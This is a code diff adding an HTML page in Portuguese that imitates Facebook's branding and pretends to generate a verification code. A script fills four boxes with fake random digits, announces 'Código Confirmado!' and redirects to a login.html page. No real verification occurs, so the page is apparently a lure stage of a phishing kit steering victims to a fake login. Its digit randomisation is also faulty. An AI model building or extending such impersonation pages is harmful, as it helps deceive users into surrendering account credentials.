@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerar Código</title>
+</head>
+<body onload="Processar()">
+    <div class="container">
+    <div class="logo">
+    <img src="../icons/icons8-facebook-novo-48.png" alt="">
+    <span class="logo-text">Facebook</span>
+</div>
+
+    <h1>Aguarde o Código de Verificação...</h1>
+<div class="input-container">
+    <input type="tel" id="num1">
+    <input type="tel" id="num2">
+    <input type="tel" id="num3">
+    <input type="tel" id="num4">
+</div>
+</div>
+</body>
+<style>
+    *{
+        margin: 0;
+        top: 0;
+        left: 0;
+        box-sizing: border-box;
+    }
+    body{
+        font-family: Arial, Helvetica, sans-serif;
+        height: 100vh;
+    }
+    .container{
+        top: 100px;
+        position: relative;
+    }
+    .logo{
+        margin: auto;
+    }
+    .logo img{
+        margin: auto;
+        display: flex;
+    }
+    .logo .logo-text {
+        font-size: 30px;
+        text-align: center;
+        margin: auto;
+        display: block;
+        color: #2c91f7;
+    }
+    h1{
+        text-align: center;
+        top: 45px;
+        position: relative;
+        color: blueviolet;
+    }
+    div.input-container{
+        display: flex;
+        margin: auto;
+        padding: 20px;
+        justify-content: center;
+        text-align: center;
+    }
+    input{
+        border: 2px solid blueviolet;
+        width: 100%;
+        max-width:60px;
+        margin-top: 10vh;
+        margin-left: 20px;
+        height: 50px;
+        color: blueviolet;
+        text-align: center;
+        font-size: 30px;
+        border-radius: 5px;
+        outline: none;
+        cursor: pointer;
+        pointer-events: none;
+    }
+    input:focus{
+        background-color: blueviolet;
+        color: white;
+        border: 2px solid white;
+    }
+</style>
+<script>
+    let cont = 0
+    function Processar(){
+      let numero1 = String(document.getElementById("num1"))
+      let numero2 = String(document.getElementById("num2"))
+      let numero3 = String(document.getElementById("num3"))
+      let numero4 = String(document.getElementById("num4"))
+     cont++
+     console.log(cont)
+
+     const Numeros = [1,2,3,
+                    4,5,6,
+                    7,8,9]
+    let numeroSorteiado = Math.floor(Math.random().toFixed()*2)
+    let numeroSorteia = Math.floor(Math.random().toFixed()*6)
+    let numeroSorte = Math.floor(Math.random().toFixed()*4)
+    let numeroS= Math.floor(Math.random().toFixed()*8)
+
+     if(cont==10){
+
+    numero1 =  document.getElementById("num1").value = Numeros[numeroSorteiado]
+    numero2 =  document.getElementById("num2").value =  Numeros[numeroSorteia]
+    numero3 =  document.getElementById("num3").value =  Numeros[numeroSorte]
+    numero4 =  document.getElementById("num4").value =  Numeros[numeroS]
+    }
+    else if(cont>=20){
+        alert("Código Confirmado!")
+        location.href = 'login.html'
+    }
+}
+    setInterval(Processar,500)
+    Processar()
+
+
+</script>
+</html>
